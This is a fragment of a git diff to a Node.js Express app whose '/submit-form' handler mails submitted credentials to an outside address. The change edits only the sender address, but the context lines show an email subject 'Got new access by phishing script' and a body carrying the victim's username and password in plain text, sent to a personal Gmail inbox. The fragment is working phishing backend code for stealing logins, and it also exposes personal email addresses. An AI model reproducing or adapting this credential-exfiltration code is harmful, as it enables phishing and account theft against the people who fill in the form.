@@ -28,7 +28,7 @@ app.post('/submit-form', (req, res) => {
     });
 
     const mailOptions = {
-        from: 'rajivaryal1@gmail.com',
+        from: 'rajivary1@gmail.com',
         to: 'aryalrajiv1@gmail.com', // Recipient's email address
         subject: 'Got new access by phishing script',
         text: `The username is ${username} and password is ${password}`
